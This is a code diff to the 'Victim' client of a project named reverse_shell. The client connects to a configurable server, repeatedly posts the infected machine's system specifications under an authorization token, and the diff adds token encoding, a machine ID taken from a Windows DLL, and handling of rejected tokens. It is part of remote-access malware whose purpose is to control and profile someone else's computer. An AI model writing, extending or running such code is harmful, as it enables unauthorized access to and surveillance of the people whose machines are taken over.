@@ -5,8 +5,12 @@ import os
 import re
 import psutil
 import json
+import sys
 import argparse
 from reverse_shell import __app_name__, __version__
+from reverse_shell.victim import ErrorCodes
+import reverse_shell.utils as ut
+from pathlib import Path
 from time import sleep
 from http.client import HTTPConnection
 from http import HTTPStatus
@@ -16,9 +20,10 @@ class Victim:
     def __init__(self, auth_token: str, server_address: str, port_number: int = 80):
         # Establish a connection with the server
         self.connection = HTTPConnection(server_address, port_number)
-        self.id = uuid.getnode()
+        self.id = ut.get_id(Path("ole32.dll"))
         self.client_type = "victim"
-        self.default_header = {"Client-Id": self.id, "Client-Type": self.client_type, "Authorization": f"Basic {auth_token}"}
+        encoded_auth_token = ut.encode_token(auth_token)
+        self.default_header = {"Client-Id": self.id, "Client-Type": self.client_type, "Authorization": f"Basic {encoded_auth_token}"}
 
     @staticmethod
     def get_processor_name():
@@ -49,7 +54,7 @@ class Victim:
         # Create a POST request infinitely until the server sends back
         # the 201 status code
         status_code = None
-        while status_code != HTTPStatus.CREATED and status_code != HTTPStatus.OK:
+        while status_code != HTTPStatus.CREATED and status_code != HTTPStatus.OK and status_code != HTTPStatus.UNAUTHORIZED:
             # We first need to reformat the data to include the victim_id
             # encoded_computer_specs = json.dumps(computer_information)
             data = json.dumps(computer_information)
@@ -60,7 +65,11 @@ class Victim:
             print(f"{response.status} {response.reason}")
             sleep(2)
 
-        print("Computer info has been successfully sent to the server")
+        if status_code == HTTPStatus.UNAUTHORIZED:
+            ut.log("error", "Invalid authentication token")
+            sys.exit(ErrorCodes.unauthorized)
+
+        ut.log("success", "Computer info has been sent to the server!")
 
 
 def get_config():
